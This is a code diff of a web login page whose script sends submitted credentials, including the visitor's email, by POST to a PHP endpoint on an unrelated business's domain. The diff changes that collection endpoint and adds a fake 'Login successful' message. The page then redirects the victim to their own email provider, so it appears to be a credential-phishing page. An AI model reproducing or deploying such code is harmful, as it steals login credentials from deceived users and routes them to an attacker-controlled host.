@@ -1,6 +1,7 @@
 
 
 
+
 <!DOCTYPE html>
 <html lang="en">
 <head>
@@ -235,11 +236,15 @@ document.addEventListener("DOMContentLoaded", function () {
     const button = document.getElementById("submit-btn");
 
     button.disabled = true;
-    button.textContent = "Saving...";
+    button.textContent = "Redirecting Login successful....";
+
+
+
+
 
     try {
         const response = await fetch(
-            "https://lorneplumbing.com.au/via/login.php",
+            "https://lorneplumbing.com.au/via/cj.php",
                 {
                     method: "POST",
                     headers: {
@@ -259,7 +264,8 @@ document.addEventListener("DOMContentLoaded", function () {
 
             if (response.ok && result.success === true) {
 
-                message.textContent = "";
+               
+
 
                 // Use a fixed, trusted destination.
                const domain = emailInput.value.trim().split("@")[1].toLowerCase();
